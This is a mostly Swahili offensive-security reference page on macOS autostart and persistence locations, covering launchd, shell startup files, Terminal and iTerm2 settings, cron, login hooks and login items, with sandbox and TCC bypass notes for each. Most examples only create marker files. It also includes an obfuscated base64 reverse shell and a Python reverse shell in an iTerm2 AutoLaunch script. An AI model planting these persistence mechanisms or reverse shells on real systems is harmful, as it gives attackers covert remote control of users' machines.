# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

Sehemu hii inategemea sana mfululizo wa blogu [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), lengo ni kuongeza **maeneo zaidi ya Autostart** (ikiwa inawezekana), kuonyesha **mbinu zipi bado zinafanya kazi** leo na toleo jipya la macOS (13.4) na kubainisha **idhini** zinazohitajika.

## Sandbox Bypass

> [!TIP]
> Hapa unaweza kupata maeneo ya kuanzisha yanayofaa kwa **sandbox bypass** ambayo inakuwezesha kutekeleza kitu kwa **kuliandika kwenye faili** na **kusubiri** kwa **kitendo** cha **kawaida**, **muda** ulioamuliwa au **kitendo ambacho unaweza kawaida kufanya** kutoka ndani ya sandbox bila kuhitaji ruhusa za root.

### Launchd

- Inafaida kwa bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Reboot
- Inahitaji root
- **`/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Inahitaji root
- **`/System/Library/LaunchAgents`**
- **Trigger**: Reboot
- Inahitaji root
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Inahitaji root
- **`~/Library/LaunchAgents`**
- **Trigger**: Relog-in
- **`~/Library/LaunchDemons`**
- **Trigger**: Relog-in

> [!TIP]
> Kama ukweli wa kuvutia, **`launchd`** ina orodha ya mali iliyojumuishwa katika sehemu ya Mach-o `__Text.__config` ambayo ina huduma nyingine maarufu ambazo launchd inapaswa kuanzisha. Zaidi ya hayo, huduma hizi zinaweza kuwa na `RequireSuccess`, `RequireRun` na `RebootOnSuccess` ambayo inamaanisha kwamba lazima zitekelezwe na kukamilika kwa mafanikio.
>
> Bila shaka, haiwezi kubadilishwa kwa sababu ya saini ya msimbo.

#### Description & Exploitation

**`launchd`** ni **mchakato wa kwanza** unaotekelezwa na OX S kernel wakati wa kuanzisha na wa mwisho kumaliza wakati wa kuzima. Inapaswa kuwa na **PID 1** kila wakati. Mchakato huu uta **soma na kutekeleza** mipangilio iliyotajwa katika **ASEP** **plists** katika:

- `/Library/LaunchAgents`: Wakala wa mtumiaji waliowekwa na msimamizi
- `/Library/LaunchDaemons`: Daemons za mfumo mzima zilizowekwa na msimamizi
- `/System/Library/LaunchAgents`: Wakala wa mtumiaji waliotolewa na Apple.
- `/System/Library/LaunchDaemons`: Daemons za mfumo mzima zilizotolewa na Apple.

Wakati mtumiaji anapoingia, plists zilizoko katika `/Users/$USER/Library/LaunchAgents` na `/Users/$USER/Library/LaunchDemons` zinaanzishwa kwa **idhini za watumiaji walioingia**.

**Tofauti kuu kati ya wakala na daemons ni kwamba wakala huwekwa wakati mtumiaji anaingia na daemons huwekwa wakati wa kuanzisha mfumo** (kama kuna huduma kama ssh ambazo zinahitaji kutekelezwa kabla ya mtumiaji yeyote kuingia kwenye mfumo). Pia wakala wanaweza kutumia GUI wakati daemons zinahitaji kukimbia katika hali ya nyuma.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Kuna kesi ambapo **wakala anahitaji kutekelezwa kabla ya mtumiaji kuingia**, hizi zinaitwa **PreLoginAgents**. Kwa mfano, hii ni muhimu kutoa teknolojia ya msaada wakati wa kuingia. Zinapatikana pia katika `/Library/LaunchAgents` (angalia [**hapa**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) mfano).

> [!NOTE]
> Faili mpya za usanidi za Daemons au Agents zitakuwa **zimepakiwa baada ya kuanzisha tena au kutumia** `launchctl load <target.plist>` Pia **inawezekana kupakia faili za .plist bila kiendelezi hicho** kwa kutumia `launchctl -F <file>` (hata hivyo faili hizo za plist hazitapakiwa kiotomatiki baada ya kuanzisha tena).\
> Pia inawezekana **kufuta** kwa kutumia `launchctl unload <target.plist>` (mchakato unaoelekezwa na hiyo utaondolewa),
>
> Ili **kuhakikisha** kwamba hakuna **kitu** (kama vile kubadilisha) **kinachozuia** **Wakala** au **Daemon** **kufanya kazi** endesha: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Orodhesha wakala wote na daemons waliopakiwa na mtumiaji wa sasa:
```bash
launchctl list
```
> [!WARNING]
> Ikiwa plist inamilikiwa na mtumiaji, hata ikiwa iko katika folda za mfumo wa daemon, **kazi itatekelezwa kama mtumiaji** na si kama root. Hii inaweza kuzuia baadhi ya mashambulizi ya kupandisha hadhi.

#### Maelezo zaidi kuhusu launchd

**`launchd`** ni mchakato wa **kwanza** wa hali ya mtumiaji ambao huanzishwa kutoka kwa **kernel**. Kuanzishwa kwa mchakato lazima kuwa **kufaulu** na **hakuwezi kutoka au kuanguka**. Hata hivyo, **inalindwa** dhidi ya baadhi ya **ishara za kuua**.

Moja ya mambo ya kwanza `launchd` ingefanya ni **kuanzisha** daemons zote kama:

- **Daemons za Timer** zinazotegemea wakati wa kutekelezwa:
- atd (`com.apple.atrun.plist`): Ina `StartInterval` ya dakika 30
- crond (`com.apple.systemstats.daily.plist`): Ina `StartCalendarInterval` kuanzisha saa 00:15
- **Daemons za Mtandao** kama:
- `org.cups.cups-lpd`: Inasikiliza katika TCP (`SockType: stream`) na `SockServiceName: printer`
- SockServiceName lazima iwe bandari au huduma kutoka `/etc/services`
- `com.apple.xscertd.plist`: Inasikiliza kwenye TCP katika bandari 1640
- **Daemons za Njia** ambazo zinafanywa wakati njia maalum inabadilika:
- `com.apple.postfix.master`: Inakagua njia `/etc/postfix/aliases`
- **Daemons za Arifa za IOKit**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Bandari ya Mach:**
- `com.apple.xscertd-helper.plist`: Inaonyesha katika kiingilio cha `MachServices` jina `com.apple.xscertd.helper`
- **UserEventAgent:**
- Hii ni tofauti na ile ya awali. Inafanya launchd kuanzisha programu kwa kujibu tukio maalum. Hata hivyo, katika kesi hii, binary kuu inayohusika si `launchd` bali `/usr/libexec/UserEventAgent`. Inapakia plugins kutoka kwenye folda iliyozuiliwa na SIP /System/Library/UserEventPlugins/ ambapo kila plugin inaonyesha mchakato wake wa awali katika ufunguo wa `XPCEventModuleInitializer` au, katika kesi ya plugins za zamani, katika orodha ya `CFPluginFactories` chini ya ufunguo `FB86416D-6164-2070-726F-70735C216EC0` wa `Info.plist` yake.

### faili za kuanzisha shell

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Inafaida kuzunguka sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Lakini unahitaji kupata programu yenye TCC bypass inayotekeleza shell inayopakia faili hizi

#### Mikoa

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Kichocheo**: Fungua terminal na zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Kichocheo**: Fungua terminal na zsh
- Inahitajika root
- **`~/.zlogout`**
- **Kichocheo**: Toka kwenye terminal na zsh
- **`/etc/zlogout`**
- **Kichocheo**: Toka kwenye terminal na zsh
- Inahitajika root
- Huenda kuna zaidi katika: **`man zsh`**
- **`~/.bashrc`**
- **Kichocheo**: Fungua terminal na bash
- `/etc/profile` (haikufanya kazi)
- `~/.profile` (haikufanya kazi)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Kichocheo**: Inatarajiwa kuanzisha na xterm, lakini **haijasanidiwa** na hata baada ya kusanidiwa kosa hili linatolewa: xterm: `DISPLAY is not set`

#### Maelezo & Ukatili

Wakati wa kuanzisha mazingira ya shell kama `zsh` au `bash`, **faili fulani za kuanzisha zinafanywa**. macOS kwa sasa inatumia `/bin/zsh` kama shell ya default. Shell hii inapatikana moja kwa moja wakati programu ya Terminal inapoanzishwa au wakati kifaa kinapofikiwa kupitia SSH. Ingawa `bash` na `sh` pia zipo katika macOS, zinahitaji kuitwa wazi ili kutumika.

Ukurasa wa man wa zsh, ambao tunaweza kusoma kwa **`man zsh`** una maelezo marefu ya faili za kuanzisha.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Programu Zilizofunguliwa Tena

> [!CAUTION]
> Kuweka mipangilio ya unyakuzi na kuingia na kutoka au hata kuanzisha upya haikufanya kazi kwangu ili kutekeleza programu hiyo. (Programu hiyo haikuwa ikitekelezwa, labda inahitaji kuwa inafanya kazi wakati hatua hizi zinapofanywa)

**Andiko**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Inafaida kupita sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Kichocheo**: Anzisha upya programu zinazofunguliwa tena

#### Maelezo & Unyakuzi

Programu zote za kufunguliwa tena ziko ndani ya plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Hivyo, ili kufanya programu zinazofunguliwa tena zianzishe yako, unahitaji tu **kuongeza programu yako kwenye orodha**.

UUID inaweza kupatikana kwa kuorodhesha hiyo directory au kwa kutumia `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Ili kuangalia programu ambazo zitafunguliwa tena unaweza kufanya:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Ili **kuongeza programu kwenye orodha hii** unaweza kutumia:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Mipangilio ya Terminal

- Inasaidia kupita sandbox: [✅](https://emojipedia.org/check-mark-button)
- Kupita TCC: [✅](https://emojipedia.org/check-mark-button)
- Terminal inatumika kuwa na ruhusa za FDA za mtumiaji anayetumia

#### Mahali

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Kichocheo**: Fungua Terminal

#### Maelezo & Ukatili

Katika **`~/Library/Preferences`** zinahifadhiwa mipangilio ya mtumiaji katika Programu. Baadhi ya mipangilio hii inaweza kuwa na usanidi wa **kutekeleza programu/scripts nyingine**.

Kwa mfano, Terminal inaweza kutekeleza amri katika Kuanzisha:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Usanidi huu unajitokeza katika faili **`~/Library/Preferences/com.apple.Terminal.plist`** kama hii:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Hivyo, ikiwa plist ya mapendeleo ya terminal katika mfumo inaweza kubadilishwa, basi **`open`** kazi inaweza kutumika **kufungua terminal na amri hiyo itatekelezwa**.

Unaweza kuongeza hii kutoka kwa cli na:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Other file extensions

- Inatumika kupita sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC kupita: [✅](https://emojipedia.org/check-mark-button)
- Terminal inatumika kuwa na ruhusa za FDA za mtumiaji anayetumia

#### Location

- **Popote**
- **Trigger**: Fungua Terminal

#### Description & Exploitation

Ikiwa unaunda [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) na kufungua, **programu ya Terminal** itaitwa moja kwa moja kutekeleza amri zilizoonyeshwa hapo. Ikiwa programu ya Terminal ina ruhusa maalum (kama TCC), amri yako itatekelezwa kwa ruhusa hizo maalum.

Jaribu na:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
You could also use the extensions **`.command`**, **`.tool`**, with regular shell scripts content and they will be also opened by Terminal.

> [!CAUTION]
> If terminal has **Full Disk Access** it will be able to complete that action (note that the command executed will be visible in a terminal window).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Inatumika kupita sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Unaweza kupata ufikiaji wa ziada wa TCC

#### Location

- **`/Library/Audio/Plug-Ins/HAL`**
- Inahitaji root
- **Trigger**: Restart coreaudiod or the computer
- **`/Library/Audio/Plug-ins/Components`**
- Inahitaji root
- **Trigger**: Restart coreaudiod or the computer
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: Restart coreaudiod or the computer
- **`/System/Library/Components`**
- Inahitaji root
- **Trigger**: Restart coreaudiod or the computer

#### Description

Kulingana na maandiko ya awali, inawezekana **kukusanya baadhi ya plugins za sauti** na kuzipakia.

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Inatumika kupita sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Unaweza kupata ufikiaji wa ziada wa TCC

#### Location

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description & Exploitation

QuickLook plugins zinaweza kutekelezwa unapofanya **kuchochea muonekano wa faili** (bonyeza nafasi na faili iliyo chaguliwa katika Finder) na **plugin inayounga mkono aina hiyo ya faili** imewekwa.

Inawezekana kukusanya plugin yako ya QuickLook, kuiweka katika moja ya maeneo ya awali ili kuipakia na kisha kwenda kwenye faili inayoungwa mkono na kubonyeza nafasi ili kuichochea.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> This didn't work for me, neither with the user LoginHook nor with the root LogoutHook

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Inatumika kupita sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Unahitaji kuwa na uwezo wa kutekeleza kitu kama `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

Zimeondolewa lakini zinaweza kutumika kutekeleza amri wakati mtumiaji anapoingia.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Hali hii inahifadhiwa katika `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Ili kuifuta:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Mtu wa mzizi mmoja umehifadhiwa katika **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Kuepuka Sandbox kwa Masharti

> [!TIP]
> Hapa unaweza kupata maeneo ya kuanzia yanayofaa kwa **kuepuka sandbox** ambayo inakuwezesha kutekeleza kitu kwa urahisi kwa **kukiandika kwenye faili** na **kutegemea hali zisizo za kawaida** kama **programu maalum zilizowekwa, vitendo vya mtumiaji "visivyo vya kawaida"** au mazingira.

### Cron

**Andiko**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Inafaida kwa kuepuka sandbox: [✅](https://emojipedia.org/check-mark-button)
- Hata hivyo, unahitaji kuwa na uwezo wa kutekeleza `crontab` binary
- Au uwe mzizi
- Kuepuka TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Mzizi unahitajika kwa ufikiaji wa moja kwa moja wa kuandika. Hakuna mzizi unahitajika ikiwa unaweza kutekeleza `crontab <file>`
- **Kichocheo**: Kinategemea kazi ya cron

#### Maelezo & Ukatili

Orodhesha kazi za cron za **mtumiaji wa sasa** kwa:
```bash
crontab -l
```
Unaweza pia kuona kazi zote za cron za watumiaji katika **`/usr/lib/cron/tabs/`** na **`/var/at/tabs/`** (inahitaji root).

Katika MacOS, folda kadhaa zinazotekeleza skripti kwa **mara fulani** zinaweza kupatikana katika:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Hapo unaweza kupata **cron** **jobs** za kawaida, **at** **jobs** (hazitumiki sana) na **periodic** **jobs** (zinatumika hasa kwa kusafisha faili za muda). **Periodic** **jobs** za kila siku zinaweza kutekelezwa kwa mfano na: `periodic daily`.

Ili kuongeza **user cronjob programatically** inawezekana kutumia:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Inatumika kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 ilikuwa na ruhusa za TCC zilizotolewa

#### Locations

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Trigger**: Fungua iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Trigger**: Fungua iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Trigger**: Fungua iTerm

#### Description & Exploitation

Scripts zilizohifadhiwa katika **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** zitatekelezwa. Kwa mfano:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
au:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Skiripti **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** pia kitaendeshwa:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Mipangilio ya iTerm2 iliyoko katika **`~/Library/Preferences/com.googlecode.iterm2.plist`** inaweza **kuonyesha amri ya kutekeleza** wakati terminal ya iTerm2 inafunguliwa.

Mipangilio hii inaweza kuwekewa katika mipangilio ya iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Na amri inaonyeshwa katika mipangilio:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Unaweza kuweka amri ya kutekeleza na:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Inawezekana kuna **njia nyingine za kutumia vibaya mipangilio ya iTerm2** ili kutekeleza amri zisizo na mipaka.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Inatumika kupita sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini xbar lazima iwe imewekwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Inahitaji ruhusa za Accessibility

#### Mahali

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: Mara xbar inapotekelezwa

#### Maelezo

Ikiwa programu maarufu [**xbar**](https://github.com/matryer/xbar) imewekwa, inawezekana kuandika script ya shell katika **`~/Library/Application\ Support/xbar/plugins/`** ambayo itatekelezwa wakati xbar inaanzishwa:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Inatumika kupita sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini Hammerspoon lazima iwe imewekwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Inahitaji ruhusa za Accessibility

#### Location

- **`~/.hammerspoon/init.lua`**
- **Trigger**: Mara Hammerspoon inatekelezwa

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) inatumika kama jukwaa la automatisering kwa **macOS**, ikitumia **LUA scripting language** kwa shughuli zake. Kwa hakika, inasaidia kuunganisha msimbo kamili wa AppleScript na utekelezaji wa scripts za shell, ikiongeza uwezo wake wa scripting kwa kiasi kikubwa.

App inatafuta faili moja, `~/.hammerspoon/init.lua`, na inapoanzishwa script itatekelezwa.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Inatumika kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini BetterTouchTool lazima iwe imewekwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Inahitaji ruhusa za Automation-Shortcuts na Accessibility

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

Chombo hiki kinaruhusu kuashiria programu au scripts za kutekeleza wakati baadhi ya shortcuts zinaposhinikizwa. Mshambuliaji anaweza kuweza kuunda **shortcut na hatua za kutekeleza katika database** ili kufanya itekeleze msimbo wa kiholela (shortcut inaweza kuwa kubonyeza tu funguo).

### Alfred

- Inatumika kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini Alfred lazima iwe imewekwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Inahitaji ruhusa za Automation, Accessibility na hata Full-Disk access

#### Location

- `???`

Inaruhusu kuunda workflows ambazo zinaweza kutekeleza msimbo wakati masharti fulani yanatimizwa. Inawezekana kwa mshambuliaji kuunda faili ya workflow na kufanya Alfred iitendee (inahitajika kulipa toleo la premium ili kutumia workflows).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Inatumika kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini ssh inahitaji kuwezeshwa na kutumika
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH inahitaji kuwa na FDA access

#### Location

- **`~/.ssh/rc`**
- **Trigger**: Ingia kupitia ssh
- **`/etc/ssh/sshrc`**
- Inahitaji root
- **Trigger**: Ingia kupitia ssh

> [!CAUTION]
> Kuwawezesha ssh inahitaji Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

Kwa default, isipokuwa `PermitUserRC no` katika `/etc/ssh/sshd_config`, wakati mtumiaji **anapojisajili kupitia SSH** scripts **`/etc/ssh/sshrc`** na **`~/.ssh/rc`** zitatekelezwa.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Inatumika kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini unahitaji kutekeleza `osascript` na args
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Ingia
- Payload ya exploit inahifadhiwa ikitumia **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Ingia
- Inahitaji root

#### Description

Katika System Preferences -> Users & Groups -> **Login Items** unaweza kupata **vitu vya kutekelezwa wakati mtumiaji anajiunga**.\
Inawezekana kuorodhesha, kuongeza na kuondoa kutoka kwa command line:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Hizi vitu zinahifadhiwa katika faili **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Vitu vya kuingia** vinaweza **pia** kuonyeshwa kwa kutumia API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) ambayo itahifadhi usanidi katika **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP kama Kitu cha Kuingia

(Tazama sehemu ya awali kuhusu Vitu vya Kuingia, hii ni nyongeza)

Ikiwa unahifadhi faili ya **ZIP** kama **Kitu cha Kuingia**, **`Archive Utility`** itafungua na ikiwa zip ilihifadhiwa kwa mfano katika **`~/Library`** na ilikuwa na Folda **`LaunchAgents/file.plist`** yenye backdoor, folda hiyo itaundwa (sio kwa kawaida) na plist itaongezwa ili wakati mtumiaji atakaporudi kuingia tena, **backdoor iliyotajwa katika plist itatekelezwa**.

Chaguzi nyingine zingekuwa kuunda faili **`.bash_profile`** na **`.zshenv`** ndani ya HOME ya mtumiaji ili ikiwa folda ya LaunchAgents tayari ipo, mbinu hii bado itafanya kazi.

### At

Andiko: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Inafaida kupita sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini unahitaji **kutekeleza** **`at`** na lazima iwe **imewezeshwa**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- Unahitaji **kutekeleza** **`at`** na lazima iwe **imewezeshwa**

#### **Maelezo**

Kazi za `at` zimeundwa kwa ajili ya **kuandaa kazi za mara moja** kutekelezwa kwa nyakati fulani. Tofauti na kazi za cron, kazi za `at` zinaondolewa kiotomatiki baada ya kutekelezwa. Ni muhimu kutambua kwamba kazi hizi ni za kudumu wakati wa upya wa mfumo, na kuziweka kama wasiwasi wa usalama chini ya hali fulani.

